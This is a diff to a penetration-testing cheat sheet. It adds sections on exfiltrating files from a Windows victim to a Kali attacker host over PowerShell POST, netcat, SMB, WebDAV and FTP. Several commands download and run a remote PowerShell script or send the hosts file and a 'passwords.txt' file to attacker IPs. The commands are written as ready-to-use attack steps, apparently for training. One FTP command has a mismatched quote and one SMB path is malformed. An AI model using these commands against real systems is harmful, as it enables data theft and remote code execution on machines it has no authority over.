@@ -169,17 +169,35 @@ If you get an error, use an account name and password:
 ## PowerShell - Base64
 - VICTIM: `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
 
-# PowerShell - POST Upload
+## PowerShell - POST Upload
 - KALI: `pip3 install uploadserver`
 - KALI: `python3 -m uploadserver`
 - VICTIM: `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
 - VICTIM: `Invoke-FileUpload -Uri http://192.168.1.13:8000/upload -File C:\Windows\System32\drivers\etc\hosts`
 
-# PowerShell - Base64 POST Upload
+## PowerShell - Base64 POST Upload
 - KALI: `nc -lvnp 8000`
 - VICTIM: `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
- - VICTIM: `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`
+- VICTIM: `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`
 
+## SMB
+- KALI: `sudo impacket-smbserver share -smb2support /tmp/`
+- VICTIM: `copy C:\Users\Rem\Desktop\passwords.txt \192.168.1.13\share\`
+
+## WebDav Uploads
+SMB over HTTP. If you try to upload files via SMB, but nothing is listening on port 445, a client will also try to upload a file via HTTP(s).
+- KALI: `sudo pip install wsgidav cheroot`
+- KALI: `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
+- VICTIM: `dir \\192.168.49.128\DavWWWRoot`
+
+DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
+
+- VICTIM: `copy C:\Users\Rem\Desktop\passwords.txt \\192.168.1.13\DavWWWRoot\`
+
+## FTP
+- KALI: `sudo python3 -m pyftpdlib --port 21 --write`
+- VICTIM: '(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
+ 
 # Redis
 
 https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
